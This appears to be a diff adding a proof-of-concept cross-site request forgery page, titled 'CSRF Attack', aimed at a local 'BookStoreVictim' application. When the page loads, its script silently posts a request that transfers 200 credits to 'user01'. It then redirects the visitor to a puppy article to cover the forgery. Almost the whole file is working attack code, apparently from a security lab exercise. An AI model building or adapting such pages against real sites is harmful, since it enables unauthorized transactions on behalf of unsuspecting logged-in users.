@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="ISO-8859-1">
+<title>CSRF Attack</title>
+</head>
+<body>
+	<script>
+		(function() {
+			var xhttp = new XMLHttpRequest();
+			xhttp.onreadystatechange = function() {
+				if (this.readyState == 4 && this.status == 200) {
+					//do nothing
+				}
+				location.href = "http://www.cutestpaw.com/articles/50-cute-puppies-make-your-girlfriend-smile/";
+			};
+			xhttp.open("POST", "http://localhost:8080/BookStoreVictim/AppController", true);
+			xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			xhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+			xhttp .send("requestType=transferCredits&toUsername=user01&amount=200");
+		})();
+	</script>
+</body>
+</html>
